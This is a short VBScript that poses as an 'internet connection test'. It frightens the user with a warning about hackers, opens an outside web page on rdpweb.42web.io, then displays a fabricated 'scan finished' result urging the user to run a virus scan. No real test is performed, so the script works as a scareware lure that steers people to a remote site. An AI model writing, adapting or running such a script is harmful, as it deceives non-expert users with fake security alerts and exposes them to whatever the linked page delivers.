Set WshShell = CreateObject("WScript.Shell")
title = "INTERNET CONNECTION TEST BY ADKO5558"
msg = "Is your internet connection safe? You should be connected to fake network and share all your websites with hackers! Do you want to test your Internet Connection?"
response = MsgBox(msg, vbYesNo + vbInformation, title)
If response = vbNo Then WScript.Quit
If response = vbYes Then
    WshShell.Run "https://rdpweb.42web.io/scnav/internet.html", 1, False
    WScript.Sleep 20000
    MsgBox "Scan Finished! Your results: Good, but not excelent. You must run the virus scan to be for 100% protected.", vbOKOnly + vbInformation, "Scan Finished!"
End If
